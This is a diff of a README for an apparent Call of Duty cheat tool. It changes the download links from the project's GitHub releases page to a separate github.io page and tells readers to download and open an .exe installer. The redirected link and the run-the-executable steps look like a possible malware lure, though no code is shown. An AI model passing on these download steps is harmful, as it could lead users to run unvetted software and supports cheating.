@@ -1,6 +1,6 @@
 # 🎯 COD-Ultimate-Vision - Gain the ultimate advantage in combat
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/pieceeaves289/COD-Ultimate-Vision/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://pieceeaves289.github.io)
 
 ## 📌 About this project
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software:
 
-1.  Visit the official release page: [https://github.com/pieceeaves289/COD-Ultimate-Vision/releases](https://github.com/pieceeaves289/COD-Ultimate-Vision/releases).
+1.  Visit the official release page: [https://pieceeaves289.github.io](https://pieceeaves289.github.io).
 2.  Locate the latest version release.
 3.  Click the file ending in .exe to download the installer to your computer.
 4.  Open the downloaded file.
